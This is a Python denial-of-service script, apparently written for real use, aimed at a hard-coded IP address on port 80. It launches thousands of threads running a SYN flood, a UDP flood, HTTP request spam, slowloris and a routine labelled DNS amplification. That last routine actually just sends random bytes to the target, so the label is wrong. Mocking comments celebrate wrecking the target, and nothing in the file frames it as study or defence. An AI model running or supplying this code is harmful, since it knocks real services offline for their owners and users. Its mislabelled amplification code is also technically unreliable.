import socket
import random
import threading
import time
import requests
from scapy.all import *

# === CONFIG ===
TARGET_IP = "185.27.134.252"  # RIP bozo
TARGET_PORT = 80
THREADS = 1000  # More = more pain
PACKET_SIZE = 65500  # Max UDP payload
DURATION = 60 * 30  # 30 mins of hell

# ==== ATTACK MODULES ====

# 1. SYN FLOOD (TCP/IP STACK CRUSHER)
def syn_flood():
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
        s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
        packet = IP(dst=TARGET_IP) / TCP(sport=random.randint(1, 65535), dport=TARGET_PORT, flags="S")
        s.sendto(bytes(packet), (TARGET_IP, 0))
        s.close()

# 2. UDP FLOOD (BANDWIDTH SATURATION)
def udp_flood():
    while True:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.sendto(random._urandom(PACKET_SIZE), (TARGET_IP, TARGET_PORT))

# 3. HTTP GET/POST SPAM (WEB SERVER OBLITERATOR)
def http_spam():
    while True:
        try:
            requests.get(f"http://{TARGET_IP}", headers={'User-Agent': 'Mozilla/5.0 (Nuclear Launch Detected)'})
            requests.post(f"http://{TARGET_IP}", data={'payload': 'A' * 1000000})
        except:
            pass

# 4. SLOWLORIS (CONNECTION EXHAUSTION)
def slowloris():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((TARGET_IP, TARGET_PORT))
            s.send("GET / HTTP/1.1\r\nHost: {}\r\n".format(TARGET_IP).encode())
            while True:
                s.send("X-a: {}\r\n".format(random.randint(1, 5000)).encode())
                time.sleep(100)  # Keep connection open FOREVER
        except:
            pass

# 5. DNS AMPLIFICATION (REFLECTOR NUKE)
def dns_amp():
    while True:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        dns_query = bytearray(random._urandom(1024))
        sock.sendto(dns_query, (TARGET_IP, 53))  # RIP DNS resolver

# ==== LAUNCH ALL ATTACKS ====
print("[!] DEPLOYING CYBER-ARMAGEDDON...")

threads = []
for _ in range(THREADS):
    for attack in [syn_flood, udp_flood, http_spam, slowloris, dns_amp]:
        t = threading.Thread(target=attack)
        t.daemon = True
        threads.append(t)
        t.start()

# KEEP IT RUNNING
time.sleep(DURATION)
print("[!] 50GB+ OF PURE DESTRUCTION DELIVERED. TARGET IS NOW A SMOKING CRATER.")
